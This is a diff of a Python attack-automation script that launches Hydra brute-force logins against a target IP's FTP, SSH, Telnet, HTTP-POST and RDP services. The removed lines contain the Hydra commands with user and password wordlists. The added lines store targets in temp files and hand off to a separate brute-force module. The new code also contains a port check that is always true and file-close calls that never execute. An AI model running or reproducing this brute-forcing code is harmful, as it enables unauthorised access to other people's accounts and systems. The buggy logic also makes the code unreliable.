@@ -127,73 +127,31 @@ while True:
         print("Begin Attack? (y/N)")
         beginattack = input().lower()
         if 'y' in beginattack:
+## Target Storage + Ip storage for modules
+            targets = open("Modules/attack/autotack/exploits/targets_tmp", "w")
+            targets.write(attackList)
+            targets.close
 
+            targets = open("Modules/attack/autotack/exploits/targets_tmp", "r")
+            print(targets.read())
+            targets.close
+
+            iptargets  = open("Modules/attack/autotack/exploits/iptargets_tmp", "w")
+            iptargets.write(targetIP)
+            iptargets.close
+
+            iptargets  = open("Modules/attack/autotack/exploits/iptargets_tmp", "r")
+            print(iptargets.read())
+            iptargets.close
         ## -- Module Integration -- ## -- maybe have attack results saved somewhere, maybe in db???
-            print('Enter Wordlist locations, or hit enter/leave blank for default')
-            print('For reference, Your current Directory:')
-            os.system('pwd')
-
-            print('\nUsername List:\n')
-            userlist = input().lower()
-            print('\nPassword List:\n')
-            passlist = input().lower()
-
-            if userlist == "":
-                userlist = 'Modules/attack/systemaccess/protocolcracker/simpleuser.txt'
-            if passlist == "":
-                passlist = 'Modules/attack/systemaccess/protocolcracker/simplepass.txt'
+                ## I know this isn't very clean,but its all I got currently
+        if '21' or '22' or '23' or '80' or '3389' in attackList:
+            os.system('python3 Modules/attack/autotack/exploits/bruteforce_hydra.py')
+            #print('it works')
+        ## Note: Need to find a way tomake it jump back to either autotack, or next script in line while stll pulling from
+        ## the target_tmp file
 
 
-            if '21' in attackList:
-                print('----------')
-                print('\nStarting FTP bruteforce\n')
-                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' ftp://' + targetIP  )
-
-            if '22' in attackList:
-                print('----------')
-                print('\nStarting SSH bruteforce\n')
-                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' ssh://' + targetIP  )
-
-                #os.system('hydra -I -L Modules/attack/systemaccess/protocolcracker/simpleuser.txt -P Modules/attack/systemaccess/protocolcracker/simplepass.txt ssh://' + targetIP  )
-
-            if '23' in attackList:
-                print('----------')
-                print('\nStarting TELNET bruteforce\n')
-                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' telnet://' + targetIP  )
-                ## later on add more options, like level of depth of scan, for now this will use basic login creds
-                print('--')
-
-
-            if '80' in attackList:
-                print('There are many possible attacks for webservers; please make a selection for which attack below')
-                http_attack_type = input().lower()
-
-                print ('''
-                    a) HTTP-POST - Webapp login forms
-                            ''')
-            ## -- HTTP POST -- ##
-                if http_attack_type == 'a':
-                    print('----------')
-                    print('For a succesful HTTP-POST attack, hydra must know the location of the login form, please enter the URL of the form below')
-                    loginform = input().lower()
-
-                    print('\nStarting HTTP-POST bruteforce\n')
-                    os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' http-post://'  + targetIP + '/' + loginform )
-                    print('--')
-
-            if '3389' in attackList:
-                print('--')
-                print('Starting RDP bruteforce')
-                print('\n')
-                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' rdp://' + targetIP  )
-                ## later on add more options, like level of depth of scan, for now this will use basic login creds
-                print('----------')
-
-
-                ## Final stuff
-            print('----------')
-            print('\nAttack completed, scroll through stdout to see if successful! Text should be green!\n')
-            print('\nType reload to head back to the main menu\n')
         ## -- logging -- ##
             #logfile = open("logs/autotack.log", "a")
             #logfile.write(log)
